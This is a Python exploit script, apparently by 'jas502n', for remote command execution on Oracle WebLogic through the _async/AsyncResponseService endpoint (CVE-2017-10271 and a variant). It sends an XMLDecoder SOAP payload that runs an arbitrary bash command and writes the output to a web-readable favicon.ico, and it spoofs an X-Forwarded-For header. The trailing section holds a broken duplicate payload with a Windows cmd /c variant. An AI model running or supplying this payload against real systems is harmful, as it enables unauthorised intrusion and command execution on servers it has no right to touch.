#author: jas502n
import requests
import sys

# url = "http://10.10.20.166:7001/_async/AsyncResponseService"


print '''
                               _____   _____ ______  
                              |  __ \ / ____|  ____| 
   __ _ ___ _   _ _ __   ___  | |__) | |    | |__    
  / _` / __| | | | '_ \ / __| |  _  /| |    |  __|   
 | (_| \__ \ |_| | | | | (__  | | \ \| |____| |____  
  \__,_|___/\__, |_| |_|\___| |_|  \_\\_____|______| 
             __/ |                                   
            |___/     By jas502n
            
            No patch for cve-2017-10271
            
            _async/AsyncResponseService RCE   
'''


url = sys.argv[1]
vuln_dir ="/_async/AsyncResponseService"

vuln_url = url + vuln_dir
print "\n>>>>The Vuln Url: %s \n" % vuln_url
cmd = sys.argv[2]
favicon_ico = "servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/favicon.ico"
payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\r\n      <void class=\"java.lang.ProcessBuilder\">\r\n        <array class=\"java.lang.String\" length=\"3\">\r\n          <void index=\"0\">\r\n            <string>/bin/bash</string>\r\n          </void>\r\n          <void index=\"1\">\r\n            <string>-c</string>\r\n          </void>\r\n          <void index=\"2\">\r\n            <string>%s > %s</string>\r\n          </void>\r\n        </array>\r\n        <void method=\"start\"/></void>\r\n    </java>\r\n</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>" % (cmd,favicon_ico)

proxies = {
    "http":"http://127.0.0.1:8080"
}

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    'Accept-Language': "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    'Accept-Encoding': "gzip, deflate",
    'Cookie': "sidebar_collapsed=false",
    'X-Forwarded-For': "127.0.0.2",
    'Connection': "close",
    'Upgrade-Insecure-Requests': "1",
    'Content-Type': "text/xml",
    'Content-Length': "1001",
    'cache-control': "no-cache"
    }

response = requests.request("POST", vuln_url, data=payload, headers=headers)


print("%s/_async/favicon.ico") % url
print(response.text)

a="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\
    " xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" 
        xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   
            <soapenv:Header> 
            <wsa:Action>xx</wsa:Action>\r\n        
                <wsa:RelatesTo>xx</wsa:RelatesTo>\r\n        
                    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\r\n            
                        <void class=\"java.lang.ProcessBuilder\">\r\n                
                            <array class=\"java.lang.String\" length=\"3\">\r\n      
                            <void index=\"0\">\r\n                        
                                <string>cmd</string>\r\n </void>\r\n                    
                            <void index=\"1\">\r\n                        
                                <string>/c</string>\r\n                    </void>\r\n 
                            <void index=\"2\">\r\n                        
                                <string>%s</string>\r\n                    </void>\r\n  
                            </array>\r\n            
                            <void method=\"start\"/><
                                /void>\r\n        </work:WorkContext>\r\n    
            </soapenv:Header>\r\n    
            <soapenv:Body>\r\n    
                <asy:onAsyncDelivery/>\r\n   
            </soapenv:Body>\r\n</soapenv:Envelope>" %  (exploit)
a="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\r\n      <void class=\"java.lang.ProcessBuilder\">\r\n        <array class=\"java.lang.String\" length=\"3\">\r\n          <void index=\"0\">\r\n            <string>/bin/bash</string>\r\n          </void>\r\n          <void index=\"1\">\r\n            <string>-c</string>\r\n          </void>\r\n          <void index=\"2\">\r\n            <string>%s > %s</string>\r\n          </void>\r\n        </array>\r\n        <void method=\"start\"/></void>\r\n    </java>\r\n</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>" % (cmd,favicon_ico)
